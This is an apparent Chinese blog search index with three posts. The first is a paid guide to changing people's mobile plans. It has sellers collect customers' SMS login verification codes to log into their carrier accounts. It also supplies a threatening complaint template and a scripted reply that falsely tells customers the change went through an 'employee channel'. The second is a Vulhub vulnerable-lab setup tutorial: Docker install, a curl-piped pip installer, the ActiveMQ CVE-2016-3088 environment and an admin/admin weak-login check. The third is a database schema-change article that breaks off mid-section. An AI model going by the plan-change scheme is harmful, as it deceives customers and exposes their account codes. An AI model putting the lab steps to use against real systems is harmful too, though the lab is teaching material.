<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>移动电信联通三网改套餐项目操作步骤</title>
      <link href="/posts/ab00480b6740/"/>
      <url>/posts/ab00480b6740/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>项目属于刚需项目，可以长期操作，同时本文章（洛栀的小窝 luozhinet.com）也会长期更新，有变动可以随时回来查看！</p><h1 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h1><p>本项目提供的步骤属于自创步骤，市面上暂时比较少，属于洛栀の小窝 luozhinet.com，而且每到月初和月末，改套餐的业务络绎不绝，截图简单看看一个号最近几天的单量！<br><img src="https://static.luozhinet.com/000/%E5%9B%BE%E7%89%87%20%281%29.png" alt="image"><br><img src="https://static.luozhinet.com/000/%E5%9B%BE%E7%89%87%20%282%29.png" alt="image"><br><img src="https://static.luozhinet.com/000/%E5%9B%BE%E7%89%87.png" alt="image"></p><p>4月中旬上架，上架的时候挂的4.9为了引流，后续一直涨价到8.9。<br>4月底爆发，同时这个项目可以在拼多多上面进行操作，拼多多上面客单价在40左右，能够获得更多收益。<br><img src="https://static.luozhinet.com/000/%E5%9B%BE%E7%89%87%20%283%29.png" alt="image"><br>可以看到也是拼了900+的单子。<br>其实这是一个无本生意，只需要很简单的几步操作就行了，2分钟的事儿。</p><p>##用户反馈<br><img src="https://static.luozhinet.com/000%2F%E5%9B%BE%E7%89%87%20(4).png" alt="image"><br><img src="https://static.luozhinet.com/000%2F%E5%9B%BE%E7%89%87%20(5).png" alt="image"><br><img src="https://static.luozhinet.com/000%2F%E5%9B%BE%E7%89%87%20(7).png" alt="image"><br><img src="https://static.luozhinet.com/000%2F%E5%9B%BE%E7%89%87%20(6).png" alt="image"></p><h1 id="套餐介绍"><a href="#套餐介绍" class="headerlink" title="套餐介绍"></a>套餐介绍</h1><p><img src="https://static.luozhinet.com/000%2F%E5%9B%BE%E7%89%87%20(8).png" alt="image"><br><img src="https://static.luozhinet.com/000%2F%E5%9B%BE%E7%89%87%20(9).png" alt="image"><br><img src="https://static.luozhinet.com/000%2F%E5%9B%BE%E7%89%87%20(10).png" alt="image"></p><h1 id="如何操作？"><a href="#如何操作？" class="headerlink" title="如何操作？"></a>如何操作？</h1><p>前期需要问到客户的手机号，号主名，然后使用官方的app进行登录，使用验证码登录，然后问客户要到验证码进行下面的操作。</p><h2 id="联通"><a href="#联通" class="headerlink" title="联通"></a>联通</h2><p><img src="https://static.luozhinet.com/000%2F%E5%9B%BE%E7%89%87%20(11).png" alt="image"><br><img src="https://static.luozhinet.com/000%2F%E5%9B%BE%E7%89%87%20(12).png" alt="image"><br><img src="https://static.luozhinet.com/000%2F%E5%9B%BE%E7%89%87%20(13).png" alt="image"><br><img src="https://static.luozhinet.com/000%2F%E5%9B%BE%E7%89%87%20(14).png" alt="image"><br>找到之后按照这个步骤填写相关内容，文案放在最后。</p><h2 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h2><p><img src="https://static.luozhinet.com/000%2F%E5%9B%BE%E7%89%87%20(15).png" alt="image"><br><img src="https://static.luozhinet.com/000%2F%E5%9B%BE%E7%89%87%20(16).png" alt="image"><br><img src="https://static.luozhinet.com/000%2F%E5%9B%BE%E7%89%87%20(17).png" alt="image"><br><img src="https://static.luozhinet.com/000%2F%E5%9B%BE%E7%89%87%20(18).png" alt="image"></p><h2 id="电信"><a href="#电信" class="headerlink" title="电信"></a>电信</h2><p><img src="https://static.luozhinet.com/000%2F1280X1280.PNG" alt="image"><br><img src="https://static.luozhinet.com/000%2F1280X1280%20(1).PNG" alt="image"><br><img src="https://static.luozhinet.com/000%2F1280X1280%20(2).PNG" alt="image"></p><p>电信这里注意：最低是5元的套餐，文案记得跟着一起改改！<br>地区归属地可以试着用自己手机号拨打一下，但是不要打通，手机上能够显示归属地，选择即可，也可以直接问客户要！</p><h1 id="文案和注意事项"><a href="#文案和注意事项" class="headerlink" title="文案和注意事项"></a>文案和注意事项</h1><h2 id="文案"><a href="#文案" class="headerlink" title="文案"></a>文案</h2><p>您好，麻烦帮忙改一下8元套餐，这个号码用的久了有很多朋友联系，平常自己用的少，但想保留，打电话客服不给处理，只能投诉了，如果还不行，只能继续投诉到工信部了，麻烦了。</p><p>也可以自己发挥一下，刚柔并济，我的文案基本上就是这样写的，都能成功。</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>提前和客户沟通的话术</p><p>更改套餐的号码不能有以下情况：<br>1.欠费停机；<br>2.副卡绑定；<br>3.宽带保底消费；<br>4.保底送话费、流量；<br>5.返还话费；<br>6.购机送话费；<br>7.合约未到期；<br>8.靓号协议；<br>9.月租打折；<br>10.有短号业务<br>如果没有上述问题，请直接拍，不成功全额退软</p><p>如果是湖北的联通，目前是办理不了，因为当地要办理需要提供低保证或者老年证才行！</p><h2 id="办理完之后的话术"><a href="#办理完之后的话术" class="headerlink" title="办理完之后的话术"></a>办理完之后的话术</h2><p>改好了，已经通过员工渠道申请了修改套餐并且进行了申诉加急处理，稍晚一点可能会有客服短信，晚点或者明天客服会与您联系，只需要同意更换成8元套餐就好了，如果一直和你墨迹推辞，态度强硬一点或者直接挂电话就行，下月会生效的，有其他问题随时和我联系哈</p><h1 id="销售平台推荐"><a href="#销售平台推荐" class="headerlink" title="销售平台推荐"></a>销售平台推荐</h1><p>从目前来看，闲鱼的流量很大，而且门槛低。<br>再就是对应的电商平台，淘宝，京东，拼多多，门槛高，但是客单价也高。<br>新出来的，从抖音、视频号、快手引流到自己私域进行改，也是不错的一个选择，但还没有尝试，这样操作客单价也不会低！</p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 移动 </tag>
            
            <tag> 电信 </tag>
            
            <tag> 联通 </tag>
            
            <tag> 三网 </tag>
            
            <tag> 改套餐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulhub靶场搭建教程</title>
      <link href="/posts/b38ac66a865e/"/>
      <url>/posts/b38ac66a865e/</url>
      
        <content type="html"><![CDATA[<h2 id="Vulhub靶机环境搭建"><a href="#Vulhub靶机环境搭建" class="headerlink" title="Vulhub靶机环境搭建"></a>Vulhub靶机环境搭建</h2><h3 id="Vulhub地址：-Vulhub下载地址"><a href="#Vulhub地址：-Vulhub下载地址" class="headerlink" title="Vulhub地址： Vulhub下载地址"></a>Vulhub地址： <a href="https://github.com/vulhub/vulhub/">Vulhub下载地址</a></h3><h3 id="一、所需环境"><a href="#一、所需环境" class="headerlink" title="一、所需环境"></a>一、所需环境</h3><h4 id="1、Ubuntu16-04"><a href="#1、Ubuntu16-04" class="headerlink" title="1、Ubuntu16.04"></a>1、Ubuntu16.04</h4><h4 id="2、最新版本Docker"><a href="#2、最新版本Docker" class="headerlink" title="2、最新版本Docker"></a>2、最新版本Docker</h4><h3 id="二、安装之路"><a href="#二、安装之路" class="headerlink" title="二、安装之路"></a>二、安装之路</h3><h4 id="1、下载Ubuntu16-04下载地址（迅雷下载64位，下载快速）PS：千万别用32位，32位环境很多64位程序都不支持。"><a href="#1、下载Ubuntu16-04下载地址（迅雷下载64位，下载快速）PS：千万别用32位，32位环境很多64位程序都不支持。" class="headerlink" title="1、下载Ubuntu16.04下载地址（迅雷下载64位，下载快速）PS：千万别用32位，32位环境很多64位程序都不支持。"></a>1、下载Ubuntu16.04<a href="http://mirrors.163.com/ubuntu-releases/16.04/ubuntu-16.04.6-server-amd64.iso.torrent">下载地址</a>（迅雷下载64位，下载快速）PS：千万别用32位，32位环境很多64位程序都不支持。</h4><h4 id="2、VM安装Ubuntu虚拟机、"><a href="#2、VM安装Ubuntu虚拟机、" class="headerlink" title="2、VM安装Ubuntu虚拟机、"></a>2、VM安装Ubuntu虚拟机、</h4><p>选择典型安装，如下图所示：<br><img src="https://static.luozhinet.com/81/1df2d3fdd764cd9b182fb89c981e62"><br>并且提前装载好ISO，如下图所示：<br><img src="https://static.luozhinet.com/69/98f71cfaf3d219062b5d22a6f3fed0"><br>下一步配置好主机名称，账户和密码，千万别进去配置，不然巨麻烦，你如果不懂可能配置一个小时还没安装好，我这种方法，不需要进去点击任何操作，它自动把系统配置好了，10分钟左右系统就装好了，如下图所示：<br><img src="https://static.luozhinet.com/92/685a3b3039edb47ab5a67ecadab94e"><br>如下代表系统安装好了<br><img src="https://static.luozhinet.com/76/7b40fc6ce04ae57581c7504991e32f"></p><h4 id="2、Ubuntu配置"><a href="#2、Ubuntu配置" class="headerlink" title="2、Ubuntu配置"></a>2、Ubuntu配置</h4><ul><li>坑点1：Ubuntu虚拟机装好了，默认是没有SSH的，你是无法通过ssh登陆配置的。</li><li>坑点2：且默认镜像源是加载CD盘，导致你无法通过apt-get install安装openssh。</li><li>坑点3：且默认镜像源是美国的，境内的网络是无法去访问美国源下载，所以需要替换成境内镜像源，</li><li>坑点4：但是尴尬点又来了，你想把境内源（内容很多，手打不现实）通过虚拟机拷贝，发现你是无法进行拷贝操作的。</li><li>坑点5：Ubuntu默认root账户是随机密码，所以你不知道root什么密码，无法使用root账户进行安装？</li></ul><h4 id="解决方案："><a href="#解决方案：" class="headerlink" title="解决方案："></a>解决方案：</h4><p>Ubuntu国内镜像源：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">deb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-properties</span><br><span class="line">deb http://archive.canonical.com/ubuntu xenial partner</span><br><span class="line">deb-src http://archive.canonical.com/ubuntu xenial partner</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse</span><br></pre></td></tr></table></figure><p><code>sudo apt-get install apt-transport-https ca-certificates software-properties-commonsudo add-apt-repository \</code></p><p>（1） 宿主机搞个国外的VPN（没有VPN就试试运气能不能访问把，哈.哈），让虚拟机通过NAT出去上国外的网，将&#x2F;etc&#x2F;resolv.conf的首DNS改成8.8.8.8<br><img src="https://static.luozhinet.com/51/011acd3e7e849ba7f44b6a5a8cc413"><br>（2） 将root密码进行修改<br>使用<code>sudo passwd</code>命令进行修改，连续输入三次当前账户的密码，root密码就和当前账户密码一样。<br>然后使用<code>su – root</code>切换到root账户输入root密码进行安装 ，中间必须有空格。<br><img src="https://static.luozhinet.com/14/a8e29a9835d779705f48619da1b551"><br>（3） 将默认源&#x2F;etc&#x2F;apt&#x2F;sources.list 加载CD盘的配置删除，就是这行<br><img src="https://static.luozhinet.com/de/b6aa77931885b23ff6a1723728b694"><br>（4） 删除完毕之后，更新镜像源，使用命令sudo apt-get update 进行更新<br><img src="https://static.luozhinet.com/df/8f25920b0d6422cb5c4e8b8cffc7cf"><br>（5） 更新完之后，你就可以安装opensssh了，安装opesn命令：<code>sudo apt-get install openssh-server</code>ssh安装完之后，ssh服务自动起来，就可以用xshell连接了<br><img src="https://static.luozhinet.com/f4/d57530fcb1b8b1c26760eee7bbfae6"><br>（6） ssh登陆上来，首先切换到root用户，然后将默认源进行备份，将上面的国内源进行替换。<code>cd /etc/apt/</code> 切换到镜像目录<code>mv sources.list source.yuanshi.list</code><br><img src="https://static.luozhinet.com/2f/547cc7f671da2450e99d26ed55a2b4"><br>这时，再用sz命令将本地的source.list上传到当前目录<br>（7） 输入sz命令提示不存在该命令，按照提示安装即可。<br>（8） 将默认源替换成国内源之后，随后就更新镜像源，更新命令<code>sudo apt-get update</code><br>（9） 这时，你就已经基本配置好Ubuntu环境了，接下来开始安装docker环境。</p><h4 id="3、安装docker存储库"><a href="#3、安装docker存储库" class="headerlink" title="3、安装docker存储库"></a>3、安装docker存储库</h4><p>（1）安装软件包以允许 apt 通过 HTTPS 使用存储库，输入以下命令安装软件包：<br><code>sudo apt-get install apt-transport-https ca-certificates curl software-properties-common</code><br>（2）添加 Docker 官方的 GPG 密钥：<br><code>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - header</code><br>确保现在系统已经拥有密钥指纹的后八个字符串：9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 ，输入指令：<br><code>sudo apt-key fingerprint 0EBFCD88</code><br>显示结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pub   4096R/0EBFCD88 2017-02-22</span><br><span class="line">      密钥指纹 = 9DC8 5822 9FC7 DD38 854A  E2D8 8D81 803C 0EBF CD88</span><br><span class="line">uid                  Docker Release (CE deb) &lt;docker@docker.com&gt;</span><br><span class="line">sub   4096R/F273FCD8 2017-02-22</span><br></pre></td></tr></table></figure><p>（3）安装docker稳定版仓库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository &quot;deb [arch=amd64] \</span><br><span class="line">https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot;</span><br></pre></td></tr></table></figure><h4 id="4、安装docker"><a href="#4、安装docker" class="headerlink" title="4、安装docker"></a>4、安装docker</h4><p>（1）更新apt镜像源索引，命令如下：<br><code>sudo apt-get update</code><br>（2）安装最新版的 Docker CE（docker社区版）<br><code>sudo apt-get install docker-ce</code><br>（3）如果不想安装最新版的 Docker，可以先查看可安装版本<br><code>apt-cache madison docker-ce</code><br>显示结果如下：<br><img src="https://static.luozhinet.com/bc/b68cb12573c920d53435e2eaa0d8fd"><br>列表的内容取决于启用了哪个存储库。第二列是Docker版本号。第三列是存储库名称，它指明了软件包来自哪个存储存储库，并通过扩展其稳定性级别。要安装特定版本，需要将本本字符串附加到包名称。<br>（4）安装指令如下：<br><code>sudo apt-get install docker-ce=&lt;VERSION&gt;</code><br>（5）通过运行 hello-world 镜像验证 Docker CE 已被正确安装<br><code>sudo docker run hello-world</code><br>若出现以下信息则表明安装成功：<br><img src="https://static.luozhinet.com/f4/2a8add59def007ecfcaa102ab683c1"></p><ul><li>安装pip，命令如下：<br><code>curl -s https://bootstrap.pypa.io/get-pip.py | python3</code></li><li>安装docker compose<br><code>pip install docker-compose</code></li></ul><h4 id="5、安装vulhub"><a href="#5、安装vulhub" class="headerlink" title="5、安装vulhub"></a>5、安装vulhub</h4><p>在根目录下新增一个文件夹，然后下载vulhub解压<br><strong>下载项目命令：</strong><code>wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip</code>（这里国内下载很慢，可以找我要已经下载好的Vulhub-54Mb）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unzip vulhub-master.zip</span><br><span class="line">cd vulhub-master</span><br></pre></td></tr></table></figure><p>如下，就代表vulhub漏洞环境下载下来了，几乎涵盖百分之80常见可验证漏洞环境。<br><img src="https://static.luozhinet.com/d7/e93be4d4f2145a80601d3682e649fc"></p><h4 id="6、Vulhub使用"><a href="#6、Vulhub使用" class="headerlink" title="6、Vulhub使用"></a>6、Vulhub使用</h4><p>这里演示activmq的漏洞cve-2016-3088为例子，Vulhub的便利就是在于不要我们去搭建环境，直接使用docker环境编译漏洞环境，就可启动漏洞环境。<br>首先进入该漏洞环境命令如下：<br><code>cd activemq/CVE-2016-3088/</code><br><img src="https://static.luozhinet.com/5f/d0d6aee76def6caaaf47bd866ff10a"><br>启动漏洞环境命令<br><code>docker-compose up -d</code><br><strong>备注：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d （推荐）或者 docker-compose build</span><br><span class="line">PS: 为什么 docker-compose build是可选的？</span><br><span class="line">docker-compose up -d运行后，会自动查找当前目录下的配置文件。如果配置文件中包含的环境均已经存在，则不会再次编译；如果配置文件中包含的环境不存在，则会自动进行编译。所以，其实 docker-compose up -d命令是包含了 docker-compose build的。</span><br><span class="line">如果更新了配置文件，你可以手工执行 docker-compose build来重新编译靶场环境。</span><br><span class="line">等待运行结束，即可自动配置好环境，然后运行</span><br></pre></td></tr></table></figure><p>下图代表启动成功<br><img src="https://static.luozhinet.com/c8/cf18b244e6c48e482a5baf646809c1"><br>使用docker ps可以看到容器已经起来，8181端口，容器ID 2bd961162b0d<br><img src="https://static.luozhinet.com/e9/b4b18a9c20ac3b26dcb3efd4954f50"><br>使用netstat也可以看到docker 代理监听端口为8161<br><img src="https://static.luozhinet.com/e3/05d34e4686a9f8825b554adeb3dd43"><br>进入容器内部看看，命令如下：<br><code>docker container exec -it 2bd961162b0d /bin/bash</code><br>下图代表我们进入activemq虚拟机了，docker就相当于时容器的宿主机。<br><img src="https://static.luozhinet.com/27/690668def708c9e254a55d90f6cfb3"><br>下图为已经运行的服务，使用http:&#x2F;&#x2F;虚拟机ip:8161<br><img src="https://static.luozhinet.com/c3/2838dfef2328694829e2524ed0da49"></p><h4 id="7、弱口令漏洞验证"><a href="#7、弱口令漏洞验证" class="headerlink" title="7、弱口令漏洞验证"></a>7、弱口令漏洞验证</h4><p>Activemq后台地址是admin，密码是admin&#x2F;admin，我们尝试登陆成功。<br><img src="https://static.luozhinet.com/42/de5c2ba05e4dd682823a276560829e"><br><img src="https://static.luozhinet.com/96/e192b1ae660dc49a8f5be74af0fa7c"><br><strong>【重要】</strong>测试完毕之后，在漏洞环境目录下使用<br><code>docker-compose down -v</code><br>即可结束服务，使环境变为初始状态。<br><img src="https://static.luozhinet.com/2e/16557916428e62172a006c715ded78"><br>其他漏洞参考vulhub的每个漏洞环境描述(README.zh-cn.md)，都已经写明漏洞利用方法，写的非常明白详细。</p><p>如cve-2016-3088，我们在github的Vulhub找到对应漏洞说明即可验证，如图<br><img src="https://static.luozhinet.com/76/338a65588733f7f93646d8d259ca54"><br>该漏洞描述链接:<a href="https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md">链接地址</a></p><h4 id="8、Dockcer常用命令"><a href="#8、Dockcer常用命令" class="headerlink" title="8、Dockcer常用命令"></a>8、Dockcer常用命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">docker ps 查看当前开启了哪些docker容器</span><br><span class="line"></span><br><span class="line">进入对应容器  docker container exec -it 容器id /bin/bash </span><br><span class="line"></span><br><span class="line">docker version 检查版本信息</span><br></pre></td></tr></table></figure><h3 id="三、参考链接"><a href="#三、参考链接" class="headerlink" title="三、参考链接"></a>三、参考链接</h3><h4 id="1、docker安装"><a href="#1、docker安装" class="headerlink" title="1、docker安装"></a>1、docker安装</h4><p><a href="https://blog.csdn.net/diligent_lee/article/details/79098302?utm_source=blogxgwz17">https://blog.csdn.net/diligent_lee&#x2F;article&#x2F;details&#x2F;79098302?utm_source&#x3D;blogxgwz17</a></p><h4 id="2、vulhub安装"><a href="#2、vulhub安装" class="headerlink" title="2、vulhub安装"></a>2、vulhub安装</h4><p><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br><a href="https://www.freebuf.com/sectool/165062.html">https://www.freebuf.com/sectool/165062.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件 </tag>
            
            <tag> 对应 </tag>
            
            <tag> 网络 </tag>
            
            <tag> 程序 </tag>
            
            <tag> docker </tag>
            
            <tag> 镜像 </tag>
            
            <tag> 地址 </tag>
            
            <tag> 命令 </tag>
            
            <tag> 软件 </tag>
            
            <tag> 后台 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> 运行 </tag>
            
            <tag> exec </tag>
            
            <tag> 安装 </tag>
            
            <tag> sudo </tag>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库系列：高并发下的数据字段变更</title>
      <link href="/posts/145ae8ead9d3/"/>
      <url>/posts/145ae8ead9d3/</url>
      
        <content type="html"><![CDATA[<h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h1><p>经常会遇到这种情况，我们的业务已经稳定地运行一段时间了，并且流量渐渐已经上去了。这时候，却因为某些原因（比如功能调整或者业务扩展），你需要对数据表进行调整，加字段 or 修改表结构。<br>可能很多人说 alter table add column … &#x2F; alter table modify …，轻轻松松就解决了。 这样其实是有风险的<br>，对于复杂度比较高、数据量比较大的表。调整表结构、创建或删除索引、触发器，都可能引起锁表，而锁表的时长依你的数据表实际情况而定。 本人有过惨痛的教训，在一次业务上线过程中没有评估好数据规模，导致长时间业务数据写入不进来。<br>那么有什么办法对数据库的业务表进行无缝升级，让该表对用户透明无感呢？下面我们一个个来讨论。</p><h1 id="2-新增关联表"><a href="#2-新增关联表" class="headerlink" title="2 新增关联表"></a>2 新增关联表</h1><p>最简单的一种办法，把新增的字段存储在另外一张辅表上，用外键关联到主表的主键。达到动态扩展的目标。后续功能上线之后，新增的数据会存储到辅表中，主表无需调整，透明、无损。<br><img src="https://static.luozhinet.com/6d/fbc7cbea60bece9f439f0db1ca0120" alt="image"><br>存在的问题：</p><ul><li>读取数据时，联表查询效率低下，数据量越大，数据越复杂，劣势越明显。</li><li>并没有彻底的解决问题，之后有新增字段，照样面临是新增表还是修改原表的问题。即使后续新增的字段都加在辅表上，同样面临锁表的问题。</li><li>辅表的作用仅仅是解决字段新增的问题，并未解决字段更新的问题（如修改字段名、数据类型等）。</li></ul><h1 id="3-新增通用列"><a href="#3-新增通用列" class="headerlink" title="3 新增通用列"></a>3 新增通用列</h1><p>假设我们原有表结构如下，为了保障业务的持续发展，后续不间断的会有字段扩展。这时候就需要考虑增加一个可自动扩缩的通用字段。<br><img src="https://static.luozhinet.com/45/67c54ab230866712b25e8229ccc741" alt="image"><br>以MySQL为例子，5.7版本版本之后提供了Json字段类型，方便我们存储复杂的Json对象数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">use test;</span><br><span class="line">DROP TABLE IF EXISTS `t_user`;</span><br><span class="line">CREATE TABLE &quot;t_user&quot; (</span><br><span class="line">  &quot;id&quot; bigint(20) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  &quot;name&quot; varchar(20) NOT NULL,</span><br><span class="line">  &quot;age&quot; int(11) DEFAULT NULL,</span><br><span class="line">  &quot;address&quot; varchar(255) DEFAULT NULL,</span><br><span class="line">  &quot;sex&quot; int(11) DEFAULT &#x27;1&#x27;,</span><br><span class="line">  &quot;ext_data&quot; json DEFAULT NULL COMMENT &#x27;json字符串&#x27;,</span><br><span class="line">  PRIMARY KEY (&quot;id&quot;)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Records of t_user</span><br><span class="line">-- ----------------------------</span><br><span class="line">INSERT INTO `t_user` VALUES (&#x27;1&#x27;, &#x27;brand&#x27;, &#x27;21&#x27;, &#x27;fuzhou&#x27;, &#x27;1&#x27;, &#x27;&#123;&quot;tel&quot;: &quot;13212345678&quot;, &quot;name&quot;: &quot;brand&quot;, &quot;address&quot;: &quot;fuzhou&quot;&#125;&#x27;);</span><br></pre></td></tr></table></figure><p>代码中 ext_data 采用Json数据类型，是一种可扩展的对象载体，存放被查询数据的信息补充。<br>同样的，MySQL提供的这种数据类型，也提供了很强大的Json函数进行操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id,`name`,age,address FROM `t_user` WHERE json_extract(ext_data,&#x27;$.tel&#x27;) = &#x27;13212345678&#x27;;</span><br></pre></td></tr></table></figure><p>结果如下：<br><img src="https://static.luozhinet.com/d9/6cbe95e1930d050e714d28d7cf12e5" alt="image"></p><p>之前写MySQL系列的时候，博客园的一位读者留言要我归纳一下MySQL Json 的用法，一直没时间，大家可以看一下<a href="https://dev.mysql.com/doc/refman/8.0/en/json-functions.html" title="官网的文档">官网的文档</a>，还是比较清晰的。</p><p>Json结构一般来说是向下兼容的，所以你在设计字段扩展的时候，一般建议往前增，不建议删除旧属性。但是这也有个问题，就是业务越复杂，Json复杂度也越高，冗余属性也越多。<br>比如上文中我们的json包含三个属性，tel、name、address，之后的业务调整中，发现tel没用了，加了个age属性，那tel要不要删除？<br>有一种比较好的办法，是给表加上version属性，每个时期的业务对应一个version，每个version对应的Json数据结构也不一样。<br><img src="https://static.luozhinet.com/be/b8cad69ac4a5340703155501e21cab" alt="image"></p><p><strong>优点：</strong></p><ul><li>可以随时动态扩展属性</li><li>新旧两种数据可以同时存在</li><li>迁移数据方便，写个程序将旧版本ext的改为新版本的ext，并修改version</li></ul><p><strong>不足：</strong></p><ul><li>ext_data里的字段无法建立索引</li><li>ext_data里的key会有大量空间占用，建议key简短一些</li><li>从json中去统计某个字段数据之类的很麻烦，而且效率低。</li><li>查询相对效率较低，操作复杂。</li><li>更新Json中的某个字段效率较低，不适合存储业务逻辑复杂的数据。</li><li>统计数据复杂，建议需要做报表的数据不要存json。</li></ul><p><strong>改进：</strong></p><ul><li>如果ext里的属性有索引之类的需求，可能NoSql（如MongoDB）会更适合</li></ul><h1 id="4-新表-数据迁移"><a href="#4-新表-数据迁移" class="headerlink" title="4 新表+数据迁移"></a>4 新表+数据迁移</h1><h2 id="4-1-利用触发器进行数据迁移"><a href="#4-1-利用触发器进行数据迁移" class="headerlink" title="4.1 利用触发器进行数据迁移"></a>4.1 利用触发器进行数据迁移</h2><p><img src="https://static.luozhinet.com/4d/1693fa53c3f4ddb495bf3d894bda8f" alt="image"><br>整个步骤如下：</p><ul><li>新建一个表t_user_v1 (id, name, age, address, sex, ext_column)，包含了扩展字段 ext_column</li><li>在原有表上添加触发器，原表的DML操作（主要INSERT、UPDATE、DELETE），都会触发操作，把数据转存到新表t_user_v1中</li><li>对于旧表中原有的数据，逐步的迁移直至完成</li><li>删掉触发器，把原表移走（默认是drop掉）</li><li>把新表t_user_v1重命名（rename）成原表t_user<br>通过上述步骤，逐渐的将数据迁移到新表，并替换旧表，整个操作无需停服维护，对用业务无损</li></ul><h2 id="4-2-利用Binlog-进行数据迁移"><a href="#4-2-利用Binlog-进行数据迁移" class="headerlink" title="4.2 利用Binlog 进行数据迁移"></a>4.2 利用Binlog 进行数据迁移</h2><p>如果是MySQL数据库，可以通过复制binlog的操作进行数据迁移的，效果一样，比起触发器，更稳定一点。<br><img src="https://static.luozhinet.com/e5/53e2842d4b4d67cff0f24ec1d31970" alt="image"></p><h2 id="4-3-存在的问题"><a href="#4-3-存在的问题" class="headerlink" title="4.3 存在的问题"></a>4.3 存在的问题</h2><ul><li>操作繁琐，效率低下</li><li>数据迁移和数据表切换之间存在操作间隙，对于高并发、高频操作的数据表，还是有风险的，会引起短暂连接失效 和 数据不一致。</li><li>对于大数据表，同步时间长</li></ul><h1 id="5-字段预留"><a href="#5-字段预留" class="headerlink" title="5 字段预留"></a>5 字段预留</h1><p>预留字段 和 字段与表格名称映射的办法。<br><img src="https://static.luozhinet.com/64/bd771ae32f415decdfcd0b2b23fe2d" alt="image"></p><h2 id="5-1-存在的问题"><a href="#5-1-存在的问题" class="headerlink" title="5.1 存在的问题"></a>5.1 